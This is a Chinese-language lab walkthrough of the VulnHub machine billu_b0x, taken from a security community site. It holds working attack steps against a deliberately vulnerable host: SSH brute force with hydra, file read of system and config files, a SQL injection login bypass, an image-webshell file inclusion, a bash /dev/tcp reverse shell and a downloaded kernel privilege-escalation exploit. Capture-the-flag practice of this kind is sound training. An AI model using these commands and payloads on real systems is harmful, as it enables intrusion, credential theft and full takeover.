# vulnhub靶机billu_b0x精讲-先知社区

> **来源**: https://xz.aliyun.com/news/16325  
> **文章ID**: 16325

---

# 靶机下载

```
https://www.vulnhub.com/entry/billu-b0x,188/
```

# 信息收集

## 扫描存活主机

```
nmap -sP 192.168.73.0/24

```

![](images/20241215233522-325f802e-bafa-1.png)

```
192.168.73.141为目标主机，对其进行进一步信息收集
```

## 端口扫描

```
nmap --min-rate=10000 -p- 192.168.73.141

```

![](images/20241215233604-4be0cefe-bafa-1.png)

目标只开放了22和80端口

### 针对端口进行TCP探测、服务探测、操作系统探测

```
nmap -T4 -sV -sT -sC -O -p80,22 192.168.73.141

```

![](images/20241215233609-4ed73e22-bafa-1.png)

22端口使用 OpenSSH 5.9p1版本

80开放了http服务，部署在Apache2.2.22上

## 目录扫描

针对http服务进行目录扫描

```
gobuster dir -u http://192.168.73.141/ -w /usr/share/wordlists/dirb/big.txt

```

![](images/20241215233619-544e3cfc-bafa-1.png)

扫描出可访问路径

```
/add
/c
/cmd
/head
/images
/images
/index
/in
/panel
/phpmy
/show
/test
```

# 漏洞挖掘

## 22端口渗透

### ssh暴力破解

因为只开放了两个端口，攻击面较少，所以要利用任何能利用的点，首先想到爆破ssh密码，开启一个窗口让hydra后台去爆破密码

```
hydra -l root -P /root/Desktop/passwd-CN-Top10000.txt ssh://192.168.73.141 -V -f

```

![](images/20241215233629-5a9cd438-bafa-1.png)

### ssh服务漏洞

看到nmap扫描结果中ssh服务使用的应用程序为OpenSSH 5.9p1，通过google搜索相关漏洞利用，发现并没有可以直接利用获取shell的攻击脚本，利用条件都很苛刻。

![](images/20241215233636-5e963d04-bafa-1.png)

## 80端口（Web）渗透

访问通过目录爆破出的几个目录

```
http://192.168.73.141/index
```

![](images/20241215233641-61850dd8-bafa-1.png)

```
http://192.168.73.141/add
```

![](images/20241215233646-64dd030a-bafa-1.png)

```
http://192.168.73.141/c
```

![](images/20241215233651-67c1391a-bafa-1.png)

```
http://192.168.73.141/cmd
```

![](images/20241215233657-6b2c3e88-bafa-1.png)

```
http://192.168.73.141/images/
```

![](images/20241215233701-6dd37b74-bafa-1.png)

```
http://192.168.73.141/in
```

![](images/20241215233706-704fa7f6-bafa-1.png)

```
http://192.168.73.141/show
```

![](images/20241215233710-72cb4562-bafa-1.png)

```
http://192.168.73.141/test
```

![](images/20241215233714-759918fa-bafa-1.png)

### 任意文件读取漏洞利用

通过观察/test目录，页面提示需要传入一个file的值，联想到任意文件读取、文件包含，这里先get去传参一个index.php

![](images/20241215233726-7c7da3d4-bafa-1.png)

传入file值未index.php发现并没有反应，尝试修改请求方式，使用POST的方式发送数据包

```
POST /test HTTP/1.1
Host: 192.168.73.141
Content-Length: 14
Cache-Control: max-age=0
Origin: http://192.168.73.141
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.73.141/test?file=index
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=bopi12nfmudsn2c5gf05pm4eo4
Connection: keep-alive

file=index.php

```

![](images/20241215233736-82ad423c-bafa-1.png)

这里读取到了index.php的源码，存在任意文件读取漏洞，分别尝试读取passwd和shadow，看看能不能获得shadow文件爆破hash直接获取到root密码。

![](images/20241215233741-8578c950-bafa-1.png)

![](images/20241215233746-88334c60-bafa-1.png)

passwd文件是可以直接读取到的，shadow文件没有权限读取，继续通过文件读取漏洞读取其他页面的源码进行代码审计。

### 文件上传漏洞利用

add目录下发现是一个文件上传的页面，利用文件包含审计源码是否做了过滤。

![](images/20241215233803-929dbf6e-bafa-1.png)

是没有做任何过滤的，尝试上传一个图片文件

![](images/20241215233808-95793bfa-bafa-1.png)

响应包中没有返回文件的上传路径，这里猜测文件可能是上传到了/images目录下，但是观察了一下没有任何数据的更新。

![](images/20241215233830-a2bafa2e-bafa-1.png)

### SQL注入漏洞利用

通过文件包含漏洞读取到的index.php源码进行代码审计。

![](images/20241215233840-a892337c-bafa-1.png)

index.php包含了c.php，head.php，而index.php又是一个登录页面，很有可能包含的就是数据库配置文件，继续利用文件读取漏洞读取源码

![](images/20241215233857-b2a37dee-bafa-1.png)

读取到c.php就是数据库配置文件，并且给出了一个数据库账号。

```
127.0.0.1
billu
b0x_billu
```

尝试远程登录到mysql

![](images/20241215233905-b7b99fa2-bafa-1.png)

数据库连接失败，因为在前期端口扫描没有扫描到mysql的服务端口，所以判断应该是修改了端口或者禁止远程登录。

尝试用账户凭证登录ssh

```
ssh billu@192.168.73.141
b0x_billu

```

![](images/20241215233913-bc316894-bafa-1.png)

登录失败

继续读取head.php的源码

![](images/20241215233923-c2253dde-bafa-1.png)

也没有发现有用的信息。

继续分析index.php的源码，在下面发现了登录逻辑，可以尝试进行sql注入

```
$uname=str_replace('\'','',urldecode($_POST['un']));
$pass=str_replace('\'','',urldecode($_POST['ps']));
$run='select * from auth where  pass=\''.$pass.'\' and uname=\''.$uname.'\'';

```

登录逻辑代码中使用str\_replace函数过滤了单引号，尝试绕过，将连接符"."分离后的sql查询语句

```
select * from auth where  pass=\'.$pass.\' and uname=\'.$uname.\'

```

这里的"\"就是转义字符，可以省略掉

```
select * from auth where  pass='pass' and uname='uname'

```

构造万能密码

```
pass传入\
uname传入or 1=1#

```

构造后的sql语句就变成了

```
select * from auth where pass='\' and uname='or 1=1#'

```

查询语句中的`' and uname='`就被逃逸出去成为了pass的值

```
pass='\' and uname='
or 1=1永真
```

![](images/20241215233934-c902dd50-bafa-1.png)

成功登陆

![](images/20241215233942-cdb0189a-bafa-1.png)

这里发现了一个文件上传的页面，和add.php是一样的，再次上传文件

![](images/20241215233953-d418b05c-bafa-1.png)

文件上传成功，文件被上传到了/uploaded\_images/下

![](images/20241215234000-d874873e-bafa-1.png)

尝试上传一句话，使用%00截断、黑名单绕过、.htaccess利用，都失败了。

### 文件包含漏洞利用

继续读取登录后的panel.php源码

```
<?php
session_start();

include('c.php');
include('head2.php');
if(@$_SESSION['logged']!=true )
{
        header('Location: index.php', true, 302);
        exit();

}


echo "Welcome to billu b0x ";
echo '<form method=post style="margin: 10px 0px 10px 95%;"><input type=submit name=lg value=Logout></form>';
if(isset($_POST['lg']))
{
    unset($_SESSION['logged']);
    unset($_SESSION['admin']);
    header('Location: index.php', true, 302);
}
echo '<hr><br>';

echo '<form method=post>

<select name=load>
    <option value="show">Show Users</option>
    <option value="add">Add User</option>
</select> 

 &nbsp<input type=submit name=continue value="continue"></form><br><br>';
if(isset($_POST['continue']))
{
    $dir=getcwd();
    $choice=str_replace('./','',$_POST['load']);

    if($choice==='add')
    {
            include($dir.'/'.$choice.'.php');
            die();
    }

        if($choice==='show')
    {

        include($dir.'/'.$choice.'.php');
        die();
    }
    else
    {
        include($dir.'/'.$_POST['load']);
    }

}


if(isset($_POST['upload']))
{

    $name=mysqli_real_escape_string($conn,$_POST['name']);
    $address=mysqli_real_escape_string($conn,$_POST['address']);
    $id=mysqli_real_escape_string($conn,$_POST['id']);

    if(!empty($_FILES['image']['name']))
    {
        $iname=mysqli_real_escape_string($conn,$_FILES['image']['name']);
    $r=pathinfo($_FILES['image']['name'],PATHINFO_EXTENSION);
    $image=array('jpeg','jpg','gif','png');
    if(in_array($r,$image))
    {
        $finfo = @new finfo(FILEINFO_MIME); 
    $filetype = @$finfo->file($_FILES['image']['tmp_name']);
        if(preg_match('/image\/jpeg/',$filetype )  || preg_match('/image\/png/',$filetype ) || preg_match('/image\/gif/',$filetype ))
                {
                    if (move_uploaded_file($_FILES['image']['tmp_name'], 'uploaded_images/'.$_FILES['image']['name']))
                             {
                              echo "Uploaded successfully ";
                              $update='insert into users(name,address,image,id) values(\''.$name.'\',\''.$address.'\',\''.$iname.'\', \''.$id.'\')'; 
                             mysqli_query($conn, $update);

                            }
                }
            else
            {
                echo "<br>i told you dear, only png,jpg and gif file are allowed";
            }
    }
    else
    {
        echo "<br>only png,jpg and gif file are allowed";

    }
}


}

?>

```

![](images/20241215234016-e1e1113e-bafa-1.png)

源码中分析出include函数没有做任何的过滤，存在任意文件包含漏洞，需要POST传参continue和load参数才能触发。

这里continue需要传入continue load需要传入图片马的地址

首先构造一个图片马上传到目标

![](images/20241215234023-e61c29f0-bafa-1.png)

重新访问panel.php，修改请求方式为POST，包含cmd.jpg，构造payload

```
POST /panel.php?cmd=whoami HTTP/1.1
Host: 192.168.73.141
Content-Length: 47
Cache-Control: max-age=0
Origin: http://192.168.73.141
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.73.141/panel.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=bopi12nfmudsn2c5gf05pm4eo4
Connection: keep-alive

load=/uploaded_images/cmd.jpg&continue=continue
```

![](images/20241215234031-ea7a657a-bafa-1.png)

成功执行系统命令

本地nc开启监听

```
nc -lvnp 8899

```

反弹shell

```
echo "bash -i >& /dev/tcp/192.168.73.138/8899 0>&1" | bash
//记得url编码

```

![](images/20241215234043-f20ed582-bafa-1.png)

![](images/20241215234048-f4bc79d8-bafa-1.png)

成功得到初始web权限的shell。

# 权限提升

用python启动一个shell以获得更好的交互性

```
python -c "import pty;pty.spawn('/bin/bash')"

```

## 信息收集

```
uname -a

```

![](images/20241215234108-00bde6c2-bafb-1.png)

## 内核提权

使用searchsploit搜索内核提权脚本

```
searchsploit Ubuntu kernel 3.13.0-32

```

![](images/20241215234115-050c13de-bafb-1.png)

```
searchsploit -m 37292

```

![](images/20241215234119-078ca222-bafb-1.png)

启动一个http服务，将exp放到上面，目标机器去下载

```
service apache2 start
cp 37292.c /var/www/html/37292.c

```

```
wget http://192.168.73.138/37292,c

```

![](images/20241215234126-0b4cebec-bafb-1.png)

发现www目录没有创建文件的权限，进入到uploaded\_images目录下

```
cd uploaded_images
wget http://192.168.73.138/37292.c
gcc 37292.c 37292
./37292

```

![](images/20241215234146-17bc25dc-bafb-1.png)

成功提权到root权限

## SSH密码爆破

![](images/20241215234209-2573d80a-bafb-1.png)

刚才都没有注意到hydra已经把ssh密码跑出来了，尝试登陆一下

![](images/20241215234217-29ab4c82-bafb-1.png)

登录成功，也是获取root权限
